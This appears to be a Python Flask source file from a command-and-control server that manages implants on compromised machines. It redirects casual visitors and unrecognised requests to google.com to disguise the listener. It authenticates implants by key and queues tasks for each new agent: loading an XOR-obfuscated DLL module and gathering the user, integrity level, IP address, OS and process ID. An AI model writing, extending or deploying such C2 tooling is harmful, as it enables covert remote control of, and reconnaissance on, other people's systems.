import json
import os

from connect.convert import string_to_base64, xor_base64
from connect.output import display
from connect.server.models import AgentModel, db, ImplantModel, TaskModel
from flask import redirect, request, jsonify


class HTTPListenerRoutes:

    def __init__(self, flask_app, task_manager):
        self.flask_app = flask_app
        self.task_manager = task_manager
        self.flask_app.add_url_rule('/<path:route>', 'dummy', self.dummy_route, methods=['GET'])
        self.flask_app.add_url_rule('/<path:route>', 'check_in', self.check_in, methods=['POST'])

    @staticmethod
    def dummy_route(route):
        display(f'{request.remote_addr} requested /{route} redirecting them to google', 'INFORMATION')
        return redirect("https://www.google.com")

    def check_in(self, route):
        try:
            batch_response = json.loads(request.get_data())
        except json.decoder.JSONDecodeError:
            #data = request.get_data().decode('utf-8')
            #display(f'Failed to parse batch response as JSON:\n{data}', 'ERROR')
            return redirect("https://www.google.com")

        if isinstance(batch_response, dict):
            display('Retrieved implant authentication: ' + str(batch_response), 'INFORMATION')
            implant = ImplantModel.query.filter_by(key=batch_response['id']).first()
            if not implant:
                display(f'Failed to find implant with id {batch_response["id"]}', 'ERROR')
                return redirect("https://www.google.com")
            return self.create_agent(implant)

        batch_request = self.task_manager.parse_batch_response(batch_response)
        return jsonify(batch_request)

    @staticmethod
    def create_agent(implant):
        agent = AgentModel(implant=implant)
        module_bytes = open(f'{os.getcwd()}/resources/modules/SystemInformation.dll', 'rb').read()
        module, key = xor_base64(module_bytes)
        parameters = ','.join([string_to_base64(module), string_to_base64(key)])
        load_task = TaskModel(agent=agent, method='load', type=0, parameters=parameters, misc='')
        whoami_task = TaskModel(agent=agent, method='whoami', type=0, parameters='', misc='')
        integrity_task = TaskModel(agent=agent, method='integrity', type=0, parameters='', misc='')
        ip_task = TaskModel(agent=agent, method='ip', type=0, parameters='', misc='')
        os_task = TaskModel(agent=agent, method='os', type=0, parameters='', misc='')
        pid_task = TaskModel(agent=agent, method='pid', type=0, parameters='', misc='')
        db.session.add_all([agent, load_task, whoami_task, integrity_task, ip_task, os_task, pid_task])
        db.session.commit()
        display(f'Created agent {agent.id} sending it to implant {implant.id}', 'INFORMATION')
        return str(agent.check_in_task_id)